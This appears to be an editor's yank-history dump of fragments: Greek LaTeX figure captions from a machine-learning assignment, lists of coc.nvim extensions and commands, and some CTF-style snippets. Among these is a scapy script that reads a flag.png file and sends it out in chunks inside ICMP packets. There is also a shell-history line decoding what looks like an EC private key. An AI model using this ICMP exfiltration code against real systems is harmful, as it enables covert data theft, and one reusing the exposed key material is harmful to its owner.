	\centering
	  \includegraphics[scale=0.25]{images/t2d.png}
	  \caption{\textlatin{T2d: Plots of hierarchical clustering on a moons dataset with different linkage}}
	\end{figure}
29d12df8a5a86e42e713fec02d1a5270|file:///home/neo/Documents/epl448/as2/as2.tex|135|33|v|tex
	Hierarchical clustering over a moons dataset with 200 2-D points
c9727272466af5e1a8cc40b8effb9aaa|file:///home/neo/Documents/epl448/as2/as2.tex|139|23|v|tex
	T2d: Plots of hierarchical clustering on a moons dataset with different linkage
9c32db3d979c0e539dc13a2b5c7fa912|file:///home/neo/Documents/epl448/as2/as2.tex|135|1|V|tex
	\subsubsection*{\textlatin{T2e: Dendrogram over a toy dataset}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.7]{images/t2e.png}
	  \caption{\textlatin{T2e: Clusters over toy dataset}}
	\end{figure}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.7]{images/t2e-dendro.png}
	  \caption{\textlatin{T2e: Dendrogram over toy dataset}}
	\end{figure}
6af88f28caf04ab3d21e8cc8a3f83b11|file:///home/neo/Documents/epl448/as2/as2.tex|149|28|v|tex
	T2: Dendrogram over a toy dataset
8114c2584fb34046e32521a2bfa90232|file:///home/neo/Documents/epl448/as2/as2.tex|153|23|v|tex
	T2e: Clusters over toy dataset
97d6d87e273976064f69d6cbd5f3a724|file:///home/neo/Documents/epl448/as2/as2.tex|157|40|v|tex
	e-dendro
3b759a9ca80234563d87672350659b2b|file:///home/neo/Documents/epl448/as2/as2.tex|158|39|v|tex
	over
cfed9ced0480454ab7ee3658bfe36dea|file:///home/neo/Documents/epl448/as2/as2.tex|158|23|v|tex
	T2e: Dendrogram  toy dataset
5df384975d9660b79368963b7d691713|file:///home/neo/Documents/epl448/as2/as2.tex|155|1|V|tex
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.7]{images/t3a-2.png}
	  \caption{\textlatin{T3a: Plot k vs metrics}}
	\end{figure}
9582b8ff3e4a007fc4c1fcdd7677e3b8|file:///home/neo/Documents/epl448/as2/as2.tex|149|1|V|tex
	\subsubsection*{\textlatin{T3b:} ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ ŒΩŒ± ŒµŒØŒΩŒ±Œπ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒ∑ Œ∑ œÄœÅŒ±Œ≥ŒºŒ±œÑŒπŒ∫ŒÆ Œ±ŒΩŒ¨Œ∏ŒµœÉŒ∑ œÉŒµ \textlatin{clusters}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t3b.png}
	  \caption{\textlatin{T3b:} ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒø \textlatin{ground truth}}
	\end{figure}
b99591b54d2e0476a3c09431f88790b2|file:///home/neo/Documents/epl448/as2/as2.tex|155|1|V|tex
	
	\subsubsection*{\textlatin{T3b:} ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ ŒΩŒ± ŒµŒØŒΩŒ±Œπ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒ∑ Œ∑ œÄœÅŒ±Œ≥ŒºŒ±œÑŒπŒ∫ŒÆ Œ±ŒΩŒ¨Œ∏ŒµœÉŒ∑ œÉŒµ \textlatin{clusters}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t3b.png}
	  \caption{\textlatin{T3b:} ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒø \textlatin{ground truth}}
	\end{figure}
40156704a2918832342ba581d174ee86|list:/extensions|14|1|V|list
	* coc-snippets	2.1.22	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.21	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.4	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-json	1.2.5	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.8	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.11	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.9	~/.config/coc/extensions/node_modules/coc-python
755947cde0cc471e39c8b55603031077|list:/extensions|5|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-pairs	1.2.21	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-snippets	2.1.22	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-yank	1.1.4	~/.config/coc/extensions/node_modules/coc-yank
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.8	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.5	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-python	1.2.9	~/.config/coc/extensions/node_modules/coc-python
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-tsserver	1.4.11	~/.config/coc/extensions/node_modules/coc-tsserver
8222065c7329afd0927851784bcab15e|list:/extensions|2|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
8fb2bb97d422062ef103c16f4a6447b9|file:///home/neo/Documents/epl448/as2/as2.tex|156|1|V|tex
	\subsubsection*{\textlatin{T3b:} ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ ŒΩŒ± ŒµŒØŒΩŒ±Œπ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒ∑ Œ∑ œÄœÅŒ±Œ≥ŒºŒ±œÑŒπŒ∫ŒÆ Œ±ŒΩŒ¨Œ∏ŒµœÉŒ∑ œÉŒµ \textlatin{clusters}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t3b.png}
	  \caption{\textlatin{T3b:} ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒø \textlatin{ground truth}}
	\end{figure}
	\newpage
aba5d1d07c811f87ba790ffe4597f662|file:///home/neo/Documents/epl448/as2/as2.tex|165|33|v|tex
	 ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ ŒΩŒ± ŒµŒØŒΩŒ±Œπ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒ∑ Œ∑ œÄœÅŒ±Œ≥ŒºŒ±œÑŒπŒ∫ŒÆ Œ±ŒΩŒ¨Œ∏ŒµœÉŒ∑ œÉŒµ \textlatin{clusters
46b3ffec09a86cd39ec14898d2be8ed7|file:///home/neo/Documents/epl448/as2/as2.tex|167|1|V|tex
	\centering
	  \includegraphics[scale=0.5]{images/t3b.png}
	  \caption{\textlatin{T3b:} ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒø \textlatin{ground truth}}
	\end{figure}
fc60dd5d56c4f8b70f81bac58dead08c|file:///home/neo/Documents/epl448/as2/as2.tex|169|29|v|tex
	ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒø \textlatin{ground truth
8a64a128b181a840a129a4ffb00c90c2|file:///home/neo/Documents/epl448/as2/as2.tex|173|28|v|tex
	 ŒëŒæŒπŒøŒªœåŒ≥Œ∑œÉŒ∑ œáœâœÅŒØœÇ Œ¥ŒπŒ±Œ∏Œ≠œÉŒπŒºŒø \textlatin{ground truth
64dc3d1e8bffc3cd95e9eb38c80fbab2|file:///home/neo/Documents/epl448/as2/as2.tex|171|1|V|tex
	\centering
	  \includegraphics[scale=0.5]{images/t4b-2.png}
	  \caption{\textlatin{T4b:} ŒôœÉœÑœåŒ≥œÅŒ±ŒºŒºŒ± Œ±ŒΩŒ¨ ŒºŒµœÑŒ±Œ≤ŒªŒ∑œÑŒÆ}
	\end{figure}
a43ebaccbd462b5185dce4c564e07a66|file:///home/neo/Documents/epl448/as2/as2.tex|177|41|v|tex
	ŒôœÉœÑœåŒ≥œÅŒ±ŒºŒºŒ± Œ±ŒΩŒ¨ ŒºŒµœÑŒ±Œ≤ŒªŒ∑œÑŒÆ
8ece31d65d355b4b77437b8c4d42e628|file:///home/neo/Documents/epl448/as2/as2.tex|165|1|V|tex
	\subsubsection*{\textlatin{T4b:} ŒëŒΩŒ±œÄŒ±œÅŒ¨œÉœÑŒ±œÉŒ∑ Œ¥ŒµŒ¥ŒøŒºŒ≠ŒΩœâŒΩ}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.6]{images/t4b-1.png}
	  \caption{\textlatin{T4b:} ŒüŒªœåŒ∫ŒªŒ∑œÅŒø œÑŒø dataframe}
	\end{figure}
	\centering
	  \includegraphics[scale=0.7]{images/t4b-2.png}
	  \caption{\textlatin{T4b:} ŒôœÉœÑœåŒ≥œÅŒ±ŒºŒºŒ± Œ±ŒΩŒ¨ ŒºŒµœÑŒ±Œ≤ŒªŒ∑œÑŒÆ}
	\end{figure}
	\centering
	  \includegraphics[scale=0.7]{images/t4b-3.png}
	  \caption{\textlatin{T4b: whisker box} Œ≥ŒπŒ± Œ∫Œ¨Œ∏Œµ ŒºŒµœÑŒ±Œ≤ŒªŒ∑œÑŒÆ}
	\end{figure}
6ddd6ffca041e504ee243040db45e6fe|file:///home/neo/Documents/epl448/as2/as2.tex|181|34|v|tex
	ŒëŒΩŒ±œÄŒ±œÅŒ¨œÉœÑŒ±œÉŒ∑
ea115f9ea7c71a70334a16c2ae585c9f|file:///home/neo/Documents/epl448/as2/as2.tex|185|28|v|tex
	 ŒüŒªœåŒ∫ŒªŒ∑œÅŒø œÑŒø dataframe
f52eb45a4eb84162cff73a625a2ea047|file:///home/neo/Documents/epl448/as2/as2.tex|185|1|V|tex
	  \caption{\textlatin{T4c:} ŒöŒ±ŒΩŒøŒΩŒπŒ∫ŒøœÄŒøŒØŒ∑œÉŒ∑ ŒºŒµ \textlatin{MinMax Scaler}}
c8ae395e24bf9d284bf5c27253c30491|file:///home/neo/Documents/epl448/as2/as2.tex|190|3|V|tex
	  \caption{\textlatin{T4c:} ŒôœÉœÑœåŒ≥œÅŒ±ŒºŒºŒ± Œ±ŒΩŒ¨ ŒºŒµœÑŒ±Œ≤ŒªŒ∑œÑŒÆ}
30348ac72acbbca8d2e88b7905d77016|file:///home/neo/Documents/epl448/as2/as2.tex|189|74|v|tex
	MinMax Scaler
1abcc838aee4b2ff716bfb3694929b21|file:///home/neo/Documents/epl448/as2/as2.tex|189|1|V|tex
	  \caption{\textlatin{T4c:} ŒöŒ±ŒΩŒøŒΩŒπŒ∫ŒøœÄŒøŒØŒ∑œÉŒ∑ ŒºŒµ \textlatin{Standard Scaler}}
43740429ff40dad51c0cdb47ef9ab12a|file:///home/neo/Documents/epl448/as2/as2.tex|194|3|V|tex
	  \caption{\textlatin{T4c: whisker box} Œ≥ŒπŒ± Œ∫Œ¨Œ∏Œµ ŒºŒµœÑŒ±Œ≤ŒªŒ∑œÑŒÆ}
1ec22087e269b34aa94cf8ff24b26857|file:///home/neo/Documents/epl448/as2/as2.tex|193|74|v|tex
	Standard Scaler
b22b1bd32af26763f80746730c8c6456|file:///home/neo/Documents/epl448/as2/as2.tex|165|1|V|tex
	\subsubsection*{\textlatin{T4b:} ŒëŒΩŒ±œÄŒ±œÅŒ¨œÉœÑŒ±œÉŒ∑ Œ¥ŒµŒ¥ŒøŒºŒ≠ŒΩœâŒΩ}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.6]{images/t4b-1.png}
	  \caption{\textlatin{T4b:} ŒüŒªœåŒ∫ŒªŒ∑œÅŒø œÑŒø dataframe}
	\end{figure}
	\centering
	  \includegraphics[scale=0.7]{images/t4b-2.png}
	  \caption{\textlatin{T4b:} ŒôœÉœÑœåŒ≥œÅŒ±ŒºŒºŒ± Œ±ŒΩŒ¨ ŒºŒµœÑŒ±Œ≤ŒªŒ∑œÑŒÆ}
	\end{figure}
df66fef81f3a0c03c530761480cf2efd|file:///home/neo/Documents/epl448/as2/as2.tex|196|59|v|tex
	Œ¥ŒµŒ¥ŒøŒºŒ≠ŒΩœâŒΩ
fb8df09b356727fbfda2d28cd78f05ee|file:///home/neo/Documents/epl448/as2/as2.tex|200|29|v|tex
	ŒüŒªœåŒ∫ŒªŒ∑œÅŒø œÑŒø dataframe
d519ec30fa64e4367b84f8cddadb36ee|file:///home/neo/Documents/epl448/as2/as2.tex|196|1|V|tex
	\subsubsection*{\textlatin{T4e:} ŒëŒΩŒ±œÄŒ±œÅŒ¨œÉœÑŒ±œÉŒ∑ Œ∫œÅŒ±œÉŒπœéŒΩ œÉœÑŒøŒΩ œáœéœÅŒø}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.2]{images/t4e-all.png}
	  \caption{\textlatin{T4e:} ŒëŒΩŒ±œÄŒ±œÅŒ¨œÉœÑŒ±œÉŒ∑ œåŒªœâŒΩ œÑœâŒΩ ŒºŒµœÑŒ±Œ≤ŒªŒ∑œÑœéŒΩ}
	\end{figure}
0f4af3247fbaaa8e0d745ff5590db965|file:///home/neo/Documents/epl448/as2/as2.tex|210|34|v|tex
	ŒëŒΩŒ±œÄŒ±œÅŒ¨œÉœÑŒ±œÉŒ∑ Œ∫œÅŒ±œÉŒπœéŒΩ œÉœÑŒøŒΩ œáœéœÅŒø
74ab4b0d892d5cf24300236c5645e331|file:///home/neo/Documents/epl448/as2/as2.tex|213|38|v|tex
	t4e-all.png
96ba0c5a960139c71f5b9089ef2d4052|file:///home/neo/Documents/epl448/as2/as2.tex|214|29|v|tex
	ŒëŒΩŒ±œÄŒ±œÅŒ¨œÉœÑŒ±œÉŒ∑ œåŒªœâŒΩ œÑœâŒΩ ŒºŒµœÑŒ±Œ≤ŒªŒ∑œÑœéŒΩ
5949466c006fb60e04f0c687d601acea|file:///home/neo/Documents/epl448/as2/as2.tex|210|1|V|tex
	\subsubsection*{\textlatin{T5a:} ŒúŒ≠œÉŒ∑ œÑŒπŒºŒÆ œÑœâŒΩ \textlatin{pixels} Œ≥ŒπŒ± Œ∫Œ¨Œ∏Œµ œàŒ∑œÜŒØŒø}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t5a.png}
	  \caption{\textlatin{T4e: Plot} œÑœâŒΩ ŒºŒ≠œÉœâŒΩ œÑŒπŒºœéŒΩ}
e6f34903ef221cc4932c52137fc0a56a|file:///home/neo/Documents/epl448/as2/as2.tex|210|1|V|tex
	\subsubsection*{\textlatin{T5a:} ŒúŒ≠œÉŒ∑ œÑŒπŒºŒÆ œÑœâŒΩ \textlatin{pixels} Œ≥ŒπŒ± Œ∫Œ¨Œ∏Œµ œàŒ∑œÜŒØŒø}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t5a.png}
	  \caption{\textlatin{T4e: Plot} œÑœâŒΩ ŒºŒ≠œÉœâŒΩ œÑŒπŒºœéŒΩ}
	\end{figure}
bc79602c7662a3790f43b862aa4dadbd|file:///home/neo/Documents/epl448/as2/as2.tex|217|34|v|tex
	ŒúŒ≠œÉŒ∑ œÑŒπŒºŒÆ œÑœâŒΩ 
d399848208da8b80a306af0fd62bb03f|file:///home/neo/Documents/epl448/as2/as2.tex|217|66|v|tex
	pixels
49ec9fbe908726670bfe84bca12c963f|file:///home/neo/Documents/epl448/as2/as2.tex|217|89|v|tex
	 Œ≥ŒπŒ± Œ∫Œ¨Œ∏Œµ œàŒ∑œÜŒØŒø
e4c0f7c56994ca8e37ba30ff1de3d31d|file:///home/neo/Documents/epl448/as2/as2.tex|221|27|v|tex
	 Plot
7dc1f1c628ce7e78eca710c61a17d877|file:///home/neo/Documents/epl448/as2/as2.tex|221|29|v|tex
	œÑœâŒΩ ŒºŒ≠œÉœâŒΩ œÑŒπŒºœéŒΩ
7e308c750e61c629a11e202d2120ddca|file:///home/neo/Documents/epl448/as2/as2.tex|217|1|V|tex
	\subsubsection*{\textlatin{T5b:} ŒïŒ∫œÄŒ±ŒØŒ¥ŒµœÖœÉŒ∑ \textlatin{Support Vector Machine}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t5b.png}
	  \caption{\textlatin{T5b:} ŒßœÅœåŒΩŒøœÇ œÄŒøœÖ œáœÅŒµŒπŒ¨œÉœÑŒ∑Œ∫Œµ Œ≥ŒπŒ± œÑŒ∑ŒΩ ŒµŒ∫œÄŒ±ŒØŒ¥ŒµœÖœÉŒ∑}
	\end{figure}
94917193d10ffccd2863a4db5112d15c|file:///home/neo/Documents/epl448/as2/as2.tex|224|34|v|tex
	ŒïŒ∫œÄŒ±ŒØŒ¥ŒµœÖœÉŒ∑ 
394dfe1836b3b2a1d2ce1c87d7c5c675|file:///home/neo/Documents/epl448/as2/as2.tex|223|1|v|tex
	
	\subsubsection*{\textlatin{T5c:} ŒúŒµŒØœâœÉŒ∑ Œ¥ŒπŒ±œÉœÑŒ¨œÉŒµœâŒΩ ŒºŒµ \textlatin{
a3559f79b42f56a4873176ef3e5e8f21|file:///home/neo/Documents/epl448/as2/as2.tex|224|84|v|tex
	Support Vector Machine
96eaa85bac0daa08443b19d9aed5b482|file:///home/neo/Documents/epl448/as2/as2.tex|227|1|V|tex
	  \includegraphics[scale=0.5]{images/t5b.png}
	  \caption{\textlatin{T5b:} ŒßœÅœåŒΩŒøœÇ œÄŒøœÖ œáœÅŒµŒπŒ¨œÉœÑŒ∑Œ∫Œµ Œ≥ŒπŒ± œÑŒ∑ŒΩ ŒµŒ∫œÄŒ±ŒØŒ¥ŒµœÖœÉŒ∑}
324accb2f80e34efa7e9e176ada2db06|file:///home/neo/Documents/epl448/as2/as2.tex|228|28|v|tex
	 ŒßœÅœåŒΩŒøœÇ œÄŒøœÖ œáœÅŒµŒπŒ¨œÉœÑŒ∑Œ∫Œµ Œ≥ŒπŒ± œÑŒ∑ŒΩ ŒµŒ∫œÄŒ±ŒØŒ¥ŒµœÖœÉŒ∑
25bba57ed569a68fc1748a8eb7440e4a|file:///home/neo/Documents/epl448/as2/as2.tex|233|34|v|tex
	ŒïŒ∫œÄŒ±ŒØŒ¥ŒµœÖœÉŒ∑
8c79e07b22435565b5aa8323bf98f9b9|file:///home/neo/Documents/epl448/as2/as2.tex|237|29|v|tex
	ŒßœÅœåŒΩŒøœÇ œÄŒøœÖ œáœÅŒµŒπŒ¨œÉœÑŒ∑Œ∫Œµ Œ≥ŒπŒ± œÑŒ∑ŒΩ ŒµŒ∫œÄŒ±ŒØŒ¥ŒµœÖœÉŒ∑
a463a47d76aef25306f94d25846ed348|file:///home/neo/Documents/epl448/as2/as2.tex|234|1|V|tex
	\subsubsection*{\textlatin{T5d:} ŒúŒµœÑŒ±Œ≤ŒøŒªŒÆ œÉœÑŒøŒΩ Œ±œÅŒπŒ∏Œºœå \textlatin{components} œÉœÑŒ∑ŒΩ œÑŒµœáŒΩŒπŒ∫ŒÆ \textlatin{PCA}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t5d.png}
	  \caption{\textlatin{T5d:} Œ†ŒØŒΩŒ±Œ∫Œ±œÇ œáœÅœåŒΩŒøœÖ Œ∫Œ±Œπ \textlatin{accuracy} ŒºŒµ Œ¥ŒπŒ±œÜŒøœÅŒµœÑŒπŒ∫ŒøœçœÇ Œ±œÅŒπŒ∏ŒºŒøœçœÇ \textlatin{components}}
	\end{figure}
78ac718447589037661f5a761916ff9d|file:///home/neo/Documents/epl448/as2/as2.tex|241|33|v|tex
	 ŒúŒµœÑŒ±Œ≤ŒøŒªŒÆ œÉœÑŒøŒΩ Œ±œÅŒπŒ∏Œºœå 
c9ac6f73d47fbe4a829b350f0377e26f|file:///home/neo/Documents/epl448/as2/as2.tex|241|86|v|tex
	 œÉœÑŒ∑ŒΩ œÑŒµœáŒΩŒπŒ∫ŒÆ \textlatin{PCA}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t5d.png}
	  \caption{\textlatin{T5d:} Œ†ŒØŒΩŒ±Œ∫Œ±œÇ œáœÅœåŒΩŒøœÖ Œ∫Œ±Œπ \textlatin{accuracy} ŒºŒµ Œ¥ŒπŒ±œÜŒøœÅŒµœÑŒπŒ∫ŒøœçœÇ Œ±œÅŒπŒ∏ŒºŒøœçœÇ \textlatin{components}}
	\end{figure}
2965f7e1b86b64e2e36fdd21703492ef|file:///home/neo/Documents/epl448/as2/as2.tex|235|1|V|tex
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t5d.png}
	  \caption{\textlatin{T5d:} Œ†ŒØŒΩŒ±Œ∫Œ±œÇ œáœÅœåŒΩŒøœÖ Œ∫Œ±Œπ \textlatin{accuracy} ŒºŒµ Œ¥ŒπŒ±œÜŒøœÅŒµœÑŒπŒ∫ŒøœçœÇ Œ±œÅŒπŒ∏ŒºŒøœçœÇ \textlatin{components}}
	\end{figure}
ad1fda01da7cc36603789ad7488a81ac|file:///home/neo/Documents/epl448/as2/as2.tex|244|1|V|tex
	  \includegraphics[scale=0.5]{images/t5e.png}
5cb1125f0a912b6e8f7ec4af095e2ec5|file:///home/neo/Documents/epl448/as2/as2.tex|244|1|V|tex
	  \includegraphics[scale=0.5]{images/t5e.png}
	  \caption{\textlatin{T5d:} Œ†ŒØŒΩŒ±Œ∫Œ±œÇ œáœÅœåŒΩŒøœÖ Œ∫Œ±Œπ \textlatin{accuracy} ŒºŒµ Œ¥ŒπŒ±œÜŒøœÅŒµœÑŒπŒ∫ŒøœçœÇ Œ±œÅŒπŒ∏ŒºŒøœçœÇ \textlatin{components}}
0aca25344ac1d0337ee00ce90c1c3adb|file:///home/neo/Documents/epl448/as2/as2.tex|245|28|v|tex
	 Œ†ŒØŒΩŒ±Œ∫Œ±œÇ œáœÅœåŒΩŒøœÖ Œ∫Œ±Œπ 
30ee16b4c4655961a8c51c67eb4ed6bf|file:///home/neo/Documents/epl448/as2/as2.tex|245|28|v|tex
	 ŒºŒµ Œ¥ŒπŒ±œÜŒøœÅŒµœÑŒπŒ∫ŒøœçœÇ Œ±œÅŒπŒ∏ŒºŒøœçœÇ 
8989d7a18efc52214a5f9d14b23c0f21|file:///home/neo/Documents/epl448/as2/as2.tex|247|28|v|tex
	 Œ†ŒØŒΩŒ±Œ∫Œ±œÇ œáœÅœåŒΩŒøœÖ Œ∫Œ±Œπ \textlatin{accuracy
979b7aa1f4c56225228a1e50c46c58b0|file:///home/neo/Documents/epl448/as2/as2.tex|247|3|V|tex
	  \caption{\textlatin{T5e:}ŒºŒµ Œ¥ŒπŒ±œÜŒøœÅŒµœÑŒπŒ∫ŒøœçœÇ Œ±œÅŒπŒ∏ŒºŒøœçœÇ \textlatin{components}}
e479a37e7dea48ecb3ce1cca9db44823|file:///home/neo/Documents/epl448/as2/as2.tex|247|28|v|tex
	ŒºŒµ Œ¥ŒπŒ±œÜŒøœÅŒµœÑŒπŒ∫ŒøœçœÇ Œ±œÅŒπŒ∏ŒºŒøœçœÇ \textlatin{components
58a0d34e74f1fe77ad90b09df0215ef0|file:///home/neo/.histfile|4451|1|V|
	echo eyJrdHkiOiJFQyIsImNydiI6IlAtMjU2IiwieCI6IktRWnRqbmVPcEN6ZDVKTXotR242bXljN19ua0JldEF4WmFSV0F6TjgwTHciLCJ5IjoiVGlmMmlfcVdYdmdfQk1CZ0k4UlU0UFJ3MnJzSkZkckdhMmpWb01qOVl2OCIsImQiOiJsbzVEdjhsTDd3U1ZWSUxZQUtqbTJVRTlVT3dYazhhdXpxRjBOZXUyckZzIn0 | base64 -d
8ed4d73efcbd21dfcf8130bbfaa45f1b|file:///home/neo/ccsc/echoes/sourcery.txt|1|1|V|text
	from scapy.layers.inet import IP, ICMP
	from scapy.all import *
	import time
	
	a = IP()/ICMP()
	a.dst = ""
	
	import binascii
	
	filename = '/home/tissaia/Desktop/flag.png'
	with open(filename, 'rb') as f:
	    content = f.read()
	
	#secret = binascii.hexlify(content)
	
	secret = content
	
	byte_start = 0
	byte_end = bytes_to_send = 64
	counter = len(secret)
	
	while counter > 0:
	    send(a/secret[byte_start:byte_end])
	    byte_start = byte_start + bytes_to_send
	    byte_end = byte_end + bytes_to_send
	    counter = counter - bytes_to_send
	    time.sleep(0.5)
b5f6313c15d839a54d3b14e2cd568119|file:///home/neo/ccsc/echoes/scan.py|8|1|V|python
	sessions = a.sessions()
058d9558fbb62b0388f8f4056f76b310|file:///home/neo/ccsc/echoes/scan.py|2|1|V|python
	a = " "
5b19f81ec89e7da9b67689d3cc7a9037|file:///home/neo/ccsc/echoes/scan.py|8|1|V|python
	for session in sessions:
a68e06a5574bc0ba970df98ac0f5df10|file:///home/neo/ccsc/echoes/scan.py|13|1|V|python
	    except:
	        pass
07f168f54e3f9cc791352d498c6655c9|file:///home/neo/ccsc/echoes/scan.py|10|1|V|python
	    try:
88212fba79159263efe2e5398b5512b7|file:///home/neo/ccsc/echoes/scan.py|9|15|v|python
	sessions[session]
5905475576a21ecdafdaab879ff45aff|file:///home/neo/ccsc/echoes/scan.py|7|1|V|python
	i = 1
6c5ef6909877dac53a1e6dc4495f8aac|file:///home/neo/ccsc/echoes/scan.py|9|1|V|python
	    if packet[TCP].dport == 8000 or packet[TCP].sport == 8000:
	        print packet
8d777f385d3dfec8815d20f7496026dc|file:///home/neo/ccsc/echoes/scan.py|6|1|v|python
	data
e699add5d9ac2f4dab6366438469edce|list:/commands|40|1|V|list
	prettier.formatFile
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	workspace.workspaceFolders	show opened workspaceFolders.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.sortImports	Sort Imports
	python.startREPL	Start REPL
	python.createTerminal	Create Terminal
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	python.viewOutput	Show output
	python.goToPythonObject	Go to Python Object
	python.setLinter	Select Linter
	python.enableLinting	Enable Linting
	python.runLinting	Run Linting
	tsserver.reloadProjects	Reload current project
	tsserver.openTsServerLog	Open log file of tsserver.
	tsserver.goToProjectConfig	Open project config file.
	tsserver.restart	Restart tsserver
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	tsserver.executeAutofix	Fix autofixable problems of current document.
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.projectConfiguration.update	Update project configuration
	java.open.serverLog	Open Java Language Server log file
	java.workspace.compile	Force Java compilation
	java.action.organizeImports	Organize Imports
	java.open.formatter.settings	Open Java formatter settings
	java.clean.workspace	Clean the Java language server workspace
	session.save	Save current vim state to session file.
	session.load	Load session by name.
	session.restart	Restart vim with current session.
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	ccls.reload	Reload Index
	ccls.restart	Restart language server
	ccls.restartLazy	Restart language server in lazy mode
	ccls.callHierarchy	Call Hierarchy
	ccls.call.useCallers	Callers
	ccls.call.useCallees	Callees
	ccls.closeCallHierarchy	Close
	ccls.inheritanceHierarchy	Inheritance Hierarchy
	ccls.closeInheritanceHierarchy	Close
	ccls.memberHierarchy	Member Hierarchy
	ccls.closeMemberHierarchy	Close
	ccls.vars	Show Variables
	ccls.call	Show Cross References
	ccls.base	Show Base
	ccls.gotoForTreeView	Go to Tree View Entry
	sh.version	Print extension version
	sh.update.bash-language-server	Update bash-language-server
	editor.action.organizeImport	run organize import code action.
	extensions.forceUpdateAll
	python.setShebangInterpreter
	tags.generate
	prettier.open-output
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	python.updateSparkLibrary
	yank.clean
263fd7c8c22aa6432ae8c16f63d0ff02|list:/commands|67|1|V|list
	ccls.base	Show Base
	ccls.call	Show Cross References
	ccls.vars	Show Variables
	ccls.reload	Reload Index
	ccls.restart	Restart language server
	ccls.restartLazy	Restart language server in lazy mode
	ccls.callHierarchy	Call Hierarchy
	ccls.call.useCallees	Callees
	ccls.call.useCallers	Callers
	ccls.gotoForTreeView	Go to Tree View Entry
